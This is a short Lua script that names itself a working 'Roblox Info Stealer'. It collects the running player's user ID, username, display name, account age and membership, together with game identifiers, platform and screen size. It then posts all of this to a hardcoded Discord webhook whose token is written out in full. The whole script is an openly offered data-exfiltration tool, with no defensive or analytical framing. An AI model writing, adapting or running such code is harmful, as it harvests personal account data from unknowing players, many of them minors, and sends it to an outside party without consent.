--[=[ Roblox Info Stealer – Working Version ]=]

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UIS = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local WEBHOOK_URL = "https://discord.com/api/webhooks/1527799897741332631/GHyVnuLK7boBHeHjjgCrTAYkkqwsu5yZuVInYPyGPI-NPdQo19XRsUkZmBxfxUsnrjgU"

local function collectInfo()
    return {
        player = {
            userId = LocalPlayer.UserId,
            name = LocalPlayer.Name,
            displayName = LocalPlayer.DisplayName,
            accountAge = LocalPlayer.AccountAge,
            membership = tostring(LocalPlayer.MembershipType),
        },
        game = {
            placeId = game.PlaceId,
            jobId = game.JobId,
            gameId = game.GameId,
            creatorId = game.CreatorId,
            creatorType = game.CreatorType,
            name = game.Name,
        },
        client = {
            platform = tostring(UIS:GetPlatform()),
            screen = tostring(Camera.ViewportSize),
        },
        timestamp = os.time(),
    }
end

local function sendData()
    local data = collectInfo()
    local jsonData = HttpService:JSONEncode(data)
    -- Wrap the JSON inside a content field for Discord
    local payload = {
        content = "```json\n" .. jsonData .. "\n```"
    }
    local json = HttpService:JSONEncode(payload)
    local response = http_request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = json
    })
    print("Status: " .. (response.StatusCode or "Unknown"))
    if response.StatusCode == 204 or response.StatusCode == 200 then
        print("✅ Data sent to Discord!")
    else
        print("❌ Failed. Body: " .. (response.Body or "Empty"))
    end
end

task.wait(2)
sendData()
